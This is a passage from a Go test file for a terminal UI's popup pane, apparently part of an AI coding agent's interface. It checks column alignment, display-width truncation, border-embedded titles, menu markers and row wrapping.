				t.Errorf("width %d: line %d is %d cells, exceeds the window width: %q", width, i, w, strip(ln))
			}
		}
	}
}

// ----------------------------------------------------------------------------
// The column contract
// ----------------------------------------------------------------------------

// popupCellOffset is the DISPLAY column a cell's text starts at within a composed row — the measure
// every alignment assertion below is written in, because a column is aligned when its cells start
// at the same display offset, not at the same byte or rune index.
func popupCellOffset(t *testing.T, line, cell string) int {
	t.Helper()
	i := strings.Index(line, cell)
	if i < 0 {
		t.Fatalf("line %q does not contain the cell %q", line, cell)
	}
	return ansi.StringWidth(line[:i])
}

// The cells of a multi-cell spec lay out as columns: whatever the width of the first cell on a
// row, every row's second cell starts at the same display column — the widest first cell plus the
// two-space gutter.
func TestPopupColumnsShareOneOffset(t *testing.T) {
	rows := []popupRow{
		{"alpha", "— llamacpp"},
		{"a-much-longer-profile", "— mlx"},
		{"b", "— vllm"},
	}
	lines := layoutPopupRows(newTheme(scheme.Default()), rows)
	want := ansi.StringWidth("a-much-longer-profile") + len(popupGutter)
	for i, ln := range lines {
		if got := popupCellOffset(t, ln, "—"); got != want {
			t.Errorf("row %d starts its second column at %d, want %d: %q", i, got, want, ln)
		}
	}
}

// Column widths are measured over ALL rows of the spec, not just the ones the scroll window shows:
// a wide row scrolled out of view still holds its column open, so the alignment cannot shift
// sideways as the selection moves down a long list.
func TestRenderPopupColumnWidthsSpanOffWindowRows(t *testing.T) {
	th := newTheme(scheme.Default())
	const longest = "a-very-long-profile-name"
	spec := popupSpec{
		rows: []popupRow{
			{"a", "— one"},
			{"b", "— two"},
			{longest, "— three"}, // outside the two-row window, still the widest first column
		},
		selected: 0,
		maxRows:  2,
	}
	lines := popupLines(strip(renderPopup(th, spec, 60)))
	if len(lines) != 2+2 { // the two borders + the two windowed rows
		t.Fatalf("popup shows %d physical lines, want 4:\n%s", len(lines), strings.Join(lines, "\n"))
	}
	if strings.Contains(strings.Join(lines, "\n"), longest) {
		t.Fatalf("the wide row was inside the window — test premise broken:\n%s", strings.Join(lines, "\n"))
	}

	const marker = 2                                          // the module's 2-cell selection marker
	leftChrome := th.popupBorder.GetHorizontalFrameSize() / 2 // the left border rune + its padding cell
	want := leftChrome + marker + ansi.StringWidth(longest) + len(popupGutter)
	for i, ln := range lines[1:3] {
		if got := popupCellOffset(t, ln, "—"); got != want {
			t.Errorf("windowed row %d starts its second column at %d, want %d (the off-window row's width): %q",
				i, got, want, ln)
		}
	}
}

// An absent optional tier is an empty cell, and an empty cell in a column another row DID fill
// still pads — so the columns after the gap stay aligned rather than sliding left on that row.
func TestPopupAbsentCellKeepsLaterColumnsAligned(t *testing.T) {
	rows := []popupRow{
		{"alpha", "— llamacpp", "· running"},
		{"beta", "", "· running"}, // no backend tier on this row
	}
	lines := layoutPopupRows(newTheme(scheme.Default()), rows)
	want := ansi.StringWidth("alpha") + len(popupGutter) + ansi.StringWidth("— llamacpp") + len(popupGutter)
	for i, ln := range lines {
		if got := popupCellOffset(t, ln, "· running"); got != want {
			t.Errorf("row %d starts its third column at %d, want %d: %q", i, got, want, ln)
		}
	}
}

// A column empty in EVERY row collapses: it contributes neither width nor gutter, so a schema tier
// no row filled costs the pane nothing and lays out exactly as if the tier were not in the schema.
func TestPopupEmptyColumnCollapses(t *testing.T) {
	withTier := layoutPopupRows(newTheme(scheme.Default()), []popupRow{
		{"a", "", "· x"},
		{"bb", "", "· y"},
	})
	want := []string{"a   · x", "bb  · y"} // first column 2 wide + the 2-space gutter, no empty column
	for i, ln := range withTier {
		if ln != want[i] {
			t.Errorf("row %d = %q, want %q (the empty column must collapse)", i, ln, want[i])
		}
	}

	withoutTier := layoutPopupRows(newTheme(scheme.Default()), []popupRow{{"a", "· x"}, {"bb", "· y"}})
	for i, ln := range withoutTier {
		if ln != withTier[i] {
			t.Errorf("row %d lays out as %q with the empty column and %q without it", i, withTier[i], ln)
		}
	}
}

// Column widths are DISPLAY widths, not rune counts: a three-glyph CJK cell is six terminal cells
// wide, exactly as wide as a six-character ASCII cell, so both rows start their next column at the
// same offset. Counting runes would measure the CJK cell at 3 and skew the whole column.
func TestPopupColumnsMeasureDisplayWidth(t *testing.T) {
	rows := []popupRow{
		{"日本語", "· three wide glyphs"}, // 3 runes, 6 display cells
		{"abcdef", "· six narrow runes"},
	}
	lines := layoutPopupRows(newTheme(scheme.Default()), rows)
	want := 6 + len(popupGutter)
	for i, ln := range lines {
		if got := popupCellOffset(t, ln, "·"); got != want {
			t.Errorf("row %d starts its second column at %d display cells, want %d: %q", i, got, want, ln)
		}
	}
}

// A row of wide runes is truncated by DISPLAY width: it stays on ONE physical line, exactly the
// box width, at every terminal size. The rune-count truncation this replaced measured a 30-glyph
// CJK row as 30 cells when it paints 60, so it left the row over-wide and the pane's own width
// clamp wrapped it onto extra lines — the same failure TestRenderPopupLongRowDoesNotWrap guards
// for ASCII.
func TestRenderPopupWideRuneRowFitsTheWidth(t *testing.T) {
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title:    "モデル",
		rows:     []popupRow{{strings.Repeat("日", 30), "· 32k"}, {"ascii-model", "· 8k"}},
		selected: 0,
		hint:     "esc dismiss",
		maxRows:  8,
	}
	wantLines := 2 + 1 + len(spec.rows) + 1 // borders + title + rows + hint
	for _, width := range []int{20, 33, 60} {
		lines := popupLines(renderPopup(th, spec, width))
		if len(lines) != wantLines {
			t.Errorf("width %d: popup has %d physical lines, want %d (a wide-rune row must truncate, not wrap):\n%s",
				width, len(lines), wantLines, strip(renderPopup(th, spec, width)))
		}
		for i, ln := range lines {
			if w := lipgloss.Width(ln); w != width {
				t.Errorf("width %d: line %d is %d cells, want %d: %q", width, i, w, width, strip(ln))
			}
		}
	}
}

// popupSingleCellGolden is a single-cell popup as the pre-column renderer (rows of plain strings)
// painted it, captured before the column engine landed. ANSI is stripped so the golden pins the
// layout rather than the colour profile of the machine running the test.
const popupSingleCellGolden = `╭──────────────────────────────────────╮
│ commands and skills                  │
│   /model                             │
│ ❯ /sessions                          │
│   /help                              │
│ esc dismiss                          │
╰──────────────────────────────────────╯`

// A single-cell spec renders exactly as it did before the popup grew columns: no gutter, no
// padding, no drift — the composed row is the label verbatim (contract 6), and the whole pane is
// byte-for-byte the pre-column golden.
func TestRenderPopupSingleCellRowsAreUnchanged(t *testing.T) {
	th := newTheme(scheme.Default())
	labels := []string{"/model", "/sessions", "/help"}
	spec := popupSpec{
		title:    "commands and skills",
		rows:     singleCellRows(labels),
		selected: 1,
		hint:     "esc dismiss",
		maxRows:  8,
	}
	if got := strip(renderPopup(th, spec, 40)); got != popupSingleCellGolden {
		t.Errorf("single-cell popup drifted from the pre-column rendering:\ngot:\n%s\n\nwant:\n%s",
			got, popupSingleCellGolden)
	}
	for i, ln := range layoutPopupRows(th, singleCellRows(labels)) {
		if ln != labels[i] {
			t.Errorf("single-cell row %d composed to %q, want the label verbatim %q", i, ln, labels[i])
		}
	}
}

// popupTitleRowGolden is a titled pane as it has always been painted — the name on the first
// content row, the top border an unbroken run of the border rune. It is the guard on
// titleInBorder being OPT-IN: every pane that does not ask for the new placement (the picker, the
// /sessions browser, the autocomplete dropdown, and both prompts as of this item) must keep this
// exact layout. ANSI is stripped so the golden pins the layout rather than the machine's colour
// profile.
const popupTitleRowGolden = `╭──────────────────────────────────────╮
│ saved sessions                       │
│ a body line that is long enough to   │
│ wrap once at forty cells             │
│   first row                          │
│ ❯ second row                         │
│ esc close                            │
╰──────────────────────────────────────╯`

// popupTitleInBorderGolden is that same spec with the title moved INTO the top border: the name
// centred between two runs of the border rune with one space each side, and the content block one
// row shorter for it — the pane's own drawing of docs/layout/user-questions-layout.md's mockup.
const popupTitleInBorderGolden = `╭─────────── saved sessions ───────────╮
│ a body line that is long enough to   │
│ wrap once at forty cells             │
│   first row                          │
│ ❯ second row                         │
│ esc close                            │
╰──────────────────────────────────────╯`

// popupTitleSpec is the representative spec both goldens above are drawn from: a title, a wrapping
// body, a selected row among several, and a hint — every block a pane can hold, so a regression in
// any of them surfaces here.
func popupTitleSpec() popupSpec {
	return popupSpec{
		title:       "saved sessions",
		body:        "a body line that is long enough to wrap once at forty cells",
		maxBodyRows: -1,
		rows:        singleCellRows([]string{"first row", "second row"}),
		selected:    1,
		hint:        "esc close",
		maxRows:     8,
	}
}

// The flag decides ONE thing — where the name is drawn — and it decides it completely: off, the
// pane is byte-for-byte the layout it has always had; on, the name is spliced into the top border
// and the row it used to occupy goes back to the pane.
func TestRenderPopupTitleInBorder(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())

	off := strip(renderPopup(th, popupTitleSpec(), 40))
	if off != popupTitleRowGolden {
		t.Errorf("titleInBorder off drifted from the title-row rendering:\ngot:\n%s\n\nwant:\n%s", off, popupTitleRowGolden)
	}

	spec := popupTitleSpec()
	spec.titleInBorder = true
	on := strip(renderPopup(th, spec, 40))
	if on != popupTitleInBorderGolden {
		t.Errorf("titleInBorder on:\ngot:\n%s\n\nwant:\n%s", on, popupTitleInBorderGolden)
	}
	for _, ln := range strings.Split(on, "\n")[1:] {
		if strings.Contains(ln, "saved sessions") {
			t.Errorf("the title is still on a content row as well as in the border: %q", ln)
		}
	}
}

// The spliced border is a border like any other: every line of the pane is exactly the width it was
// drawn at — the title's spaces and its two dash runs add up to the same span the plain border
// fills — and no cell of it is left on the terminal's default background, so the name does not read
// as a hole punched in the frame.
func TestRenderPopupTitleInBorderKeepsTheBoxContract(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	spec := popupTitleSpec()
	spec.titleInBorder = true
	for _, width := range []int{24, 40, 61, 98} {
		out := renderPopup(th, spec, width)
		for i, ln := range popupLines(out) {
			if w := lipgloss.Width(ln); w != width {
				t.Errorf("width %d: line %d is %d cells, want %d: %q", width, i, w, width, strip(ln))
			}
			if col, ok := firstCellWithoutBackground(ln); !ok {
				t.Errorf("width %d: line %d has a bare (no-background) cell at column %d: %q", width, i, col, strip(ln))
			}
		}
	}
}

// An empty title with the flag on opens the pane on a plain, unbroken border — the untitled box a
// surface whose body is its own heading asks for — and still spends no content row on a heading.
func TestRenderPopupTitleInBorderEmptyTitleIsPlain(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	spec := popupTitleSpec()
	spec.titleInBorder = true
	spec.title = ""
	const width = 40
	lines := popupLines(renderPopup(th, spec, width))
	want := "╭" + strings.Repeat("─", width-2) + "╮"
	if got := strip(lines[0]); got != want {
		t.Errorf("empty title with the flag on drew %q, want the plain border %q", got, want)
	}
	if got, want := popupInterior(lines[1]), "a body line that is long enough to"; got != want {
		t.Errorf("first content row is %q, want the body's first line %q — the title still cost a row", got, want)
	}
}

// Narrowness elides an embedded title exactly as it elides a title ROW: the name is fitted to the
// pane's inner width first (truncateToWidth), so a title wider than the box it names is cut to an
// ellipsis rather than pushing the border past the terminal's last column.
func TestRenderPopupTitleInBorderElidesOnANarrowPane(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title:         "a title far wider than this pane can ever seat",
		titleInBorder: true,
		selected:      -1,
		hint:          "esc close",
	}
	const width = 24
	top := strip(popupLines(renderPopup(th, spec, width))[0])
	if lipgloss.Width(top) != width {
		t.Fatalf("titled border is %d cells, want %d: %q", lipgloss.Width(top), width, top)
	}
	if !strings.Contains(top, "…") {
		t.Errorf("a title too wide for the pane was not elided: %q", top)
	}
	if strings.Contains(top, "seat") {
		t.Errorf("the elided title kept its tail: %q", top)
	}
}

// The honesty guarantee follows the title wherever it is drawn: a pane that had to drop prose
// counts the dropped lines on the row that carries its name, and moving that name into the border
// moves the count with it. A pane cannot go quiet about what it is hiding by changing where its
// title sits.
func TestRenderPopupTitleInBorderCarriesTheElisionCount(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title:         "Approve write_file?",
		titleInBorder: true,
		body:          "a reason long enough to need several wrapped lines at this width, none of which the pane can seat",
		maxBodyRows:   0, // the shortest window: no row left for prose (popupBudget)
		selected:      -1,
		hint:          "esc cancel",
	}
	top := strip(popupLines(renderPopup(th, spec, 60))[0])
	if !elisionMarkerPattern.MatchString(top) {
		t.Errorf("the border title dropped the elision count for a body it could not show: %q", top)
	}
}

// A title is a name, and a name has no layout: whatever a caller hands as one, the pane spends
// exactly ONE line on it (popupTitleLine folds). This is the backstop under every surface that
// composes a title out of bytes it did not author — an MCP server's tool name reaches the approval
// pane's border this way — where an unfolded newline broke the box open and painted a row of the
// model's choosing outside the pane's own budget and outside its border.
//
// The assertion is byte-for-byte against the SAME pane titled with the folded string, on both title
// placements, because folding must be all the fold does: no line lost, no line gained, no width
// spent differently. The width check that follows is the box contract the broken row violated.
func TestRenderPopupTitleFoldsNewlines(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	const width = 40
	for _, inBorder := range []bool{false, true} {
		name := "title row"
		if inBorder {
			name = "title in border"
		}
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			multi, folded := popupTitleSpec(), popupTitleSpec()
			multi.titleInBorder, folded.titleInBorder = inBorder, inBorder
			multi.title, folded.title = "saved sessions\nesc close", "saved sessions esc close"

			got := strip(renderPopup(th, multi, width))
			if want := strip(renderPopup(th, folded, width)); got != want {
				t.Errorf("a title carrying \\n does not render as the folded title:\ngot:\n%s\n\nwant:\n%s", got, want)
			}
			for i, ln := range popupLines(renderPopup(th, multi, width)) {
				if w := lipgloss.Width(ln); w != width {
					t.Errorf("line %d is %d cells, want %d: %q", i, w, width, strip(ln))
				}
			}
		})
	}
}

// titleFromBody is the identity a body-is-the-heading pane keeps at the heights that seat none of
// that body, and it is scoped to exactly those heights: the flag decides what the border says only
// when the body block came back with every one of its own lines traded for the elision marker. With
// a line of the body on the screen the pane is already naming itself, and the flag must change
// nothing at all — which is what keeps the untitled border the normal appearance of the surface that
// asks for it (docs/layout/user-questions-layout.md).
func TestRenderPopupTitleFromBody(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	const (
		width = 40
		lead  = "which way should I take this refactor"
		plain = "╭──────────────────────────────────────╮"
	)
	base := func() popupSpec {
		return popupSpec{
			titleInBorder: true,
			rowStyle:      popupRowStyle{titleFromBody: true},
			body:          lead + " of the resolution pipeline, now that the gate has moved?",
			maxBodyRows:   -1,
			rows:          singleCellRows([]string{"first row", "second row"}),
			selected:      0,
			hint:          "esc close",
			maxRows:       8,
		}
	}

	t.Run("the body has a row of its own", func(t *testing.T) {
		t.Parallel()
		spec := base()
		off := spec
		off.rowStyle.titleFromBody = false
		on := strip(renderPopup(th, spec, width))
		if got := strip(renderPopup(th, off, width)); on != got {
			t.Errorf("the flag changed a pane whose body is on the screen:\nwith:\n%s\n\nwithout:\n%s", on, got)
		}
		if top := popupLines(on)[0]; strip(top) != plain {
			t.Errorf("top border = %q, want the plain %q", strip(top), plain)
		}
	})

	// One body row, spent entirely on the marker: the case the ask prompt reaches wherever its grant
	// past the pane's chrome is down to its offering's anchor row plus one line — a mechanism, not a
	// height band, since it moves with how tall that row lands. There the pane used to be a count and
	// a hint.
	t.Run("the body's one row went to the marker", func(t *testing.T) {
		t.Parallel()
		spec := base()
		spec.maxBodyRows = 1
		top := strip(popupLines(renderPopup(th, spec, width))[0])
		if !strings.Contains(top, "which way should I take") {
			t.Errorf("top border = %q, want it to lead with the body — the pane's only identity here", top)
		}
	})

	// No body row at all is the same fact one row further down, and the count still rides out with the
	// name: a fallback title may not push the elision marker off the row it is stated on.
	t.Run("no body row at all", func(t *testing.T) {
		t.Parallel()
		spec := base()
		spec.maxBodyRows = 0
		top := strip(popupLines(renderPopup(th, spec, width))[0])
		if !strings.Contains(top, "which way") {
			t.Errorf("top border = %q, want it to lead with the body", top)
		}
		if !elisionMarkerPattern.MatchString(top) {
			t.Errorf("top border = %q, want the count for the lines the pane dropped", top)
		}
	})

	// A spec that names itself keeps its own name: the fallback stands in for an identity, it does not
	// compete with one.
	t.Run("an explicit title wins", func(t *testing.T) {
		t.Parallel()
		spec := base()
		spec.maxBodyRows = 0
		spec.title = "saved sessions"
		top := strip(popupLines(renderPopup(th, spec, width))[0])
		if !strings.Contains(top, "saved sessions") || strings.Contains(top, "which way") {
			t.Errorf("top border = %q, want the spec's own title", top)
		}
	})

	// And without titleInBorder the flag is inert, because there the fallback would have to claim a
	// title ROW — the row the budget had just refused the body — and no pane may grow while shrinking.
	t.Run("it claims no row without titleInBorder", func(t *testing.T) {
		t.Parallel()
		spec := base()
		spec.maxBodyRows = 0
		spec.titleInBorder = false
		on := popupLines(renderPopup(th, spec, width))
		off := spec
		off.rowStyle.titleFromBody = false
		if got := popupLines(renderPopup(th, off, width)); len(on) != len(got) {
			t.Fatalf("the pane is %d rows with the flag and %d without it", len(on), len(got))
		}
		for _, ln := range on {
			if strings.Contains(strip(ln), "which way") {
				t.Errorf("the fallback title was drawn on a pane that has no border to put it in: %q", strip(ln))
			}
		}
	})
}

// A title-in-border pane is one row shorter than the same pane with a title row — that is the whole
// point of the placement — and the chrome constant the budget reserves says the same thing, so the
// row the border took back is spent on the pane's content rather than left unclaimed
// ([Model.popupBudget]).
func TestPopupTitleInBorderChromeIsOneRowShorter(t *testing.T) {
	t.Parallel()
	if popupTitleBorderChrome != popupChrome-1 {
		t.Errorf("popupTitleBorderChrome = %d, want %d (one row less than popupChrome)", popupTitleBorderChrome, popupChrome-1)
	}
	th := newTheme(scheme.Default())
	spec := popupTitleSpec()
	rowsOff := len(popupLines(renderPopup(th, spec, 40)))
	spec.titleInBorder = true
	rowsOn := len(popupLines(renderPopup(th, spec, 40)))
	if rowsOn != rowsOff-1 {
		t.Errorf("title-in-border pane is %d rows, want %d (one less than the %d-row titled pane)", rowsOn, rowsOff-1, rowsOff)
	}
}

// styleSGR is the SGR sequence a style opens its rendered text with — the probe the marker/highlight
// assertions test for, rather than a byte golden of a whole styled line, so a lipgloss renderer
// change cannot false-fail them.
func styleSGR(style lipgloss.Style) string {
	probe := style.Render("x")
	return probe[:strings.IndexByte(probe, 'm')+1]
}

// popupMenuRowsGolden is popupTitleSpec's row list painted as a MENU: the selected row pointed at by
// ❯, the other row led by ·, and the labels in one column either way — the pane's own drawing of
// docs/layout/user-questions-layout.md's option list. The bar the flag-off rendering paints behind
// the selected row leaves no trace here because ANSI is stripped; TestRenderPopupMenuRowsHaveNoBar
// below is what pins its absence.
const popupMenuRowsGolden = `╭──────────────────────────────────────╮
│ saved sessions                       │
│ a body line that is long enough to   │
│ wrap once at forty cells             │
│ · first row                          │
│ ❯ second row                         │
│ esc close                            │
╰──────────────────────────────────────╯`

// The flag decides ONE thing — how the rows are MARKED — and it decides it completely: off, the pane
// is byte-for-byte the list rendering the picker, the /sessions browser and the autocomplete dropdown
// have always had (two blank cells before an unselected label); on, every row that is not the answer
// leads with the dot and the labels stay in the one column, so moving the selection moves the marker
// and not the text.
func TestRenderPopupMenuRows(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())

	off := strip(renderPopup(th, popupTitleSpec(), 40))
	if off != popupTitleRowGolden {
		t.Errorf("menuRows off drifted from the list rendering:\ngot:\n%s\n\nwant:\n%s", off, popupTitleRowGolden)
	}

	spec := popupTitleSpec()
	spec.menuRows = true
	on := strip(renderPopup(th, spec, 40))
	if on != popupMenuRowsGolden {
		t.Errorf("menuRows on:\ngot:\n%s\n\nwant:\n%s", on, popupMenuRowsGolden)
	}
}

// The selected row of a menu is lit, not barred: it carries the accent style's SGR and the ❯, and
// th.userBlock's full-width highlight — the cue the flag exists to replace — appears nowhere in the
// pane. A bar behind one of four options on a decision surface reads as a banner across a quarter of
// the box; the accent says the same thing in the width of one glyph.
func TestRenderPopupMenuRowsHaveNoBar(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	spec := popupTitleSpec()
	spec.menuRows = true
	out := renderPopup(th, spec, 40)

	if !strings.Contains(strip(out), glyphUser+" second row") {
		t.Errorf("selected menu row missing the %q pointer:\n%s", glyphUser, strip(out))
	}
	if sgr := styleSGR(th.popupAccent); !strings.Contains(out, sgr) {
		t.Errorf("selected menu row carries no accent SGR %q", sgr)
	}
	if sgr := styleSGR(th.userBlock); strings.Contains(out, sgr) {
		t.Errorf("a menu row still carries the userBlock highlight bar %q", sgr)
	}
}

// An unselected menu row is the dot AND the faint style — the two halves of "this is an option you
// have not chosen". Losing either one leaves the rows reading as equals with a stray glyph in front
// of them.
func TestRenderPopupMenuUnselectedRowsAreFaintDots(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	spec := popupTitleSpec()
	spec.menuRows = true
	lines := popupLines(renderPopup(th, spec, 40))

	var unselected string
	for _, ln := range lines {
		if strings.HasPrefix(popupInterior(ln), glyphMenuUnselected+" first row") {
			unselected = ln
		}
	}
	if unselected == "" {
		t.Fatalf("no unselected row led with %q:\n%s", glyphMenuUnselected, strip(strings.Join(lines, "\n")))
	}
	if sgr := styleSGR(th.statusFaint); !strings.Contains(unselected, sgr) {
		t.Errorf("unselected menu row is not faint (%q): %q", sgr, unselected)
	}
	if sgr := styleSGR(th.popupAccent); strings.Contains(unselected, sgr) {
		t.Errorf("unselected menu row carries the selected row's accent %q: %q", sgr, unselected)
	}
}

// Menu style changes the marker, not the layout: a two-cell row still lands its second column at one
// offset down the whole pane, selected row included. That is what the approval prompt's right-hand
// [a]/[s]/[d]/[esc] shortcut column rides on — the ❯ and the · are the same two cells wide, so the
// columns cannot shift as the selection moves.
func TestRenderPopupMenuRowsKeepColumnsAligned(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	spec := popupSpec{
		rows: []popupRow{
			{"Allow", "[a]"},
			{"Always allow this session", "[s]"},
			{"Deny", "[d]"},
			{"Cancel", "[esc]"},
		},
		menuRows: true,
		selected: 0,
		maxRows:  8,
	}
	lines := popupLines(renderPopup(th, spec, 60))

	// In DISPLAY cells, never in bytes: ❯ is three bytes and · is two, so a byte offset would report
	// the pointer row a column off from the rows below it and call an aligned pane broken.
	offsets := make([]int, 0, len(spec.rows))
	for _, ln := range lines {
		if i := strings.IndexByte(strip(ln), '['); i >= 0 {
			offsets = append(offsets, lipgloss.Width(strip(ln)[:i]))
		}
	}
	if len(offsets) != len(spec.rows) {
		t.Fatalf("found %d shortcut cells, want %d:\n%s", len(offsets), len(spec.rows), strip(strings.Join(lines, "\n")))
	}
	for i, off := range offsets {
		if off != offsets[0] {
			t.Errorf("row %d's shortcut column starts at %d, want %d (the column the first row opened)", i, off, offsets[0])
		}
	}
}

// popupContent strips a rendered popup line of its ANSI styling and its border chrome but KEEPS the
// content's own leading spaces — popupInterior trims them, and the hanging indent under a wrapped
// row's marker is exactly what these assertions are about.
func popupContent(line string) string {
	s := strings.TrimSuffix(strings.TrimPrefix(strip(line), "│"), "│")
	s = strings.TrimPrefix(s, " ") // the box's one-cell left padding, not the content's indent
	return strings.TrimRight(s, " ")
}

// popupStyledLines are the rendered lines carrying style's SGR — the probe that says which lines a
// selection cue reached, without a byte golden of the styling itself (styleSGR).
func popupStyledLines(lines []string, sgr string) []string {
	var out []string
	for _, ln := range lines {
		if strings.Contains(ln, sgr) {
			out = append(out, ln)
		}
	}
	return out
}

// popupWrapSpec is a menu of answers written as SENTENCES — the shape a decision surface takes once
// a model may offer prose (docs/layout/user-questions-layout.md's multi-option mockup): two options
// that fit a line and one that no pane seats on one, the long one selected.
func popupWrapSpec() popupSpec {
	return popupSpec{
		rows: singleCellRows([]string{
			"Just do it all in one shot and commit once.",
			"Commit each piece as you go and run make check after every commit.",
			"Implement the config redesign first, commit it, then do the TUI part in a separate commit.",
		}),
		menuRows: true,
		wrapRows: true,
		rowStyle: popupRowStyle{gap: true},
		selected: 2,
		maxRows:  -1,
	}
}

// A row too wide for the pane BREAKS instead of eliding, and its continuation lines hang at exactly
// the marker's two cells — so the tail of an option lands under the head of it, no option ends in an
// ellipsis, and every line is still exactly the width the box was drawn at.
func TestRenderPopupWrappedRowsHangUnderTheirMarker(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	const width = 48
	spec := popupWrapSpec()
	lines := popupLines(renderPopup(th, spec, width))

	if len(lines) <= 2+len(spec.rows) {
		t.Fatalf("popup is %d lines: nothing wrapped:\n%s", len(lines), strip(strings.Join(lines, "\n")))
	}
	for i, ln := range lines {
		if w := lipgloss.Width(ln); w != width {
			t.Errorf("line %d is %d cells, want %d: %q", i, w, width, strip(ln))
		}
	}
	if joined := strip(strings.Join(lines, "\n")); strings.Contains(joined, "…") {
		t.Errorf("a wrapping row still elided:\n%s", joined)
	}

	var flat []string
	for _, ln := range lines[1 : len(lines)-1] { // the content rows, borders excluded
		content := popupContent(ln)
		if content == "" {
			continue // a row-gap separator
		}
		if !strings.HasPrefix(content, glyphUser) && !strings.HasPrefix(content, glyphMenuUnselected) {
			if !strings.HasPrefix(content, strings.Repeat(" ", popupRowIndent)) ||
				strings.HasPrefix(content, strings.Repeat(" ", popupRowIndent+1)) {
				t.Errorf("continuation line %q does not hang at %d cells, under the marker's own column", content, popupRowIndent)
			}
		}
		flat = append(flat, strings.TrimLeft(content, glyphUser+glyphMenuUnselected+" "))
	}

	whole := strings.Join(strings.Fields(strings.Join(flat, " ")), " ")
	for _, row := range spec.rows {
		if !strings.Contains(whole, row[0]) {
			t.Errorf("option %q did not survive the wrap:\n%s", row[0], whole)
		}
	}
}

// A COLUMNED row wraps under its own LAST column: the marker cells before it keep their column all
// the way down the pane, and the prose hangs under where the prose began rather than under the
// checkbox beside it (popupRowHangingIndent). It is the same promise the single-cell case makes one
// column further in — an option reads as one block of text — and it is what lets the multi-select ask
// prompt put its boxes in a column instead of gluing them onto the labels.
func TestRenderPopupWrappedColumnedRowsHangUnderTheirLastColumn(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	const width = 48
	const long = "Implement the config redesign first, commit it, then do the TUI part in a separate commit."
	spec := popupSpec{
		rows: []popupRow{
			{"[✔]", "Just do it all in one shot."},
			{"[ ]", long},
		},
		menuRows: true,
		wrapRows: true,
		rowStyle: popupRowStyle{gap: true},
		selected: 0,
		maxRows:  -1,
	}
	lines := popupLines(renderPopup(th, spec, width))
	got := strip(strings.Join(lines, "\n"))

	for i, ln := range lines {
		if w := lipgloss.Width(ln); w != width {
			t.Errorf("line %d is %d cells, want %d: %q", i, w, width, strip(ln))
		}
	}
	if strings.Contains(got, "…") {
		t.Errorf("a wrapping columned row still elided:\n%s", got)
	}

	hang := popupRowIndent + lipgloss.Width("[ ]"+popupGutter)
	var wrapped []string
	for _, ln := range lines[1 : len(lines)-1] { // content rows, borders excluded
		content := popupContent(ln)
		switch {
		case content == "":
			continue // a row-gap separator
		case strings.HasPrefix(content, glyphUser), strings.HasPrefix(content, glyphMenuUnselected):
			// A row's FIRST line: the marker, then the checkbox at the one column.
			if box := lipgloss.Width(content[:strings.Index(content, "[")]); box != popupRowIndent {
				t.Errorf("checkbox column starts at cell %d, want %d: %q", box, popupRowIndent, content)
			}
			continue
		}
		if !strings.HasPrefix(content, strings.Repeat(" ", hang)) || strings.HasPrefix(content, strings.Repeat(" ", hang+1)) {
			t.Errorf("continuation line %q does not hang at %d cells, under the label's own column:\n%s", content, hang, got)
		}
		wrapped = append(wrapped, strings.TrimSpace(content))
	}
	if len(wrapped) == 0 {
		t.Fatalf("the long option did not wrap at all:\n%s", got)
	}
	if !strings.HasSuffix(long, strings.Join(wrapped, " ")) {
		t.Errorf("the wrapped tail reads %q, want the end of %q:\n%s", strings.Join(wrapped, " "), long, got)
	}
}

// popupRowStyle.gap sets consecutive rows one blank line apart and nothing else: no separator opens the list
// and none closes it, where the box's own padding already stands. With the flag off the list is the
// unbroken block it has always been.
func TestRenderPopupRowGapSeparatesRowsOnly(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	base := popupSpec{
		rows:     singleCellRows([]string{"one", "two", "three"}),
		menuRows: true,
		selected: 0,
		maxRows:  -1,
	}

	spec := base
	spec.rowStyle.gap = true
	lines := popupLines(renderPopup(th, spec, 40))
	if got, want := len(lines), 2+len(spec.rows)+2; got != want {
		t.Fatalf("gapped list is %d lines, want %d (3 rows + 2 separators + 2 borders):\n%s",
			got, want, strip(strings.Join(lines, "\n")))
	}
	for i, ln := range lines[1 : len(lines)-1] {
		blank := popupContent(ln) == ""
		if want := i%2 == 1; blank != want {
			t.Errorf("content line %d blank = %v, want %v (separators sit BETWEEN rows only): %q",
				i, blank, want, popupContent(ln))
		}
	}

	if got, want := len(popupLines(renderPopup(th, base, 40))), 2+len(base.rows); got != want {
		t.Errorf("gap off is %d lines, want %d: the list gained a separator it did not ask for", got, want)
	}
}

// rowPadAbove and the row style's padBelow set the row BLOCK one blank line off what stands above it and below
// it, EACH END ON ITS OWN — the ask box asks for both, the approval box for the opening one alone
// (docs/layout/user-questions-layout.md) — and neither puts a line between rows that did not ask for
// a gap. The pad is also the LAST thing the row budget pays for: it is the only part of the block
// that is not content, so a window that can seat every row unpadded keeps the rows and drops the
// blanks — both ends together, since a block that kept one and dropped the other would move rather
// than tighten — instead of scrolling an option off the pane to make room for whitespace.
func TestRenderPopupRowPadSurroundsTheBlock(t *testing.T) {
	t.Parallel()
	th := newTheme(scheme.Default())
	base := popupSpec{
		rows:     singleCellRows([]string{"one", "two", "three"}),
		menuRows: true,
		selected: 0,
		maxRows:  -1,
	}

	// contentBlanks is which of the pane's content lines (borders excluded) are blank.
	contentBlanks := func(lines []string) []bool {
		out := make([]bool, 0, len(lines)-2)
		for _, ln := range lines[1 : len(lines)-1] {
			out = append(out, popupContent(ln) == "")
		}
		return out
	}

	for name, tc := range map[string]struct {
		above, below bool
		maxRows      int
		want         []bool // the blank/filled shape of the content block
	}{
		"both ends, uncapped":                      {true, true, -1, []bool{true, false, false, false, true}},
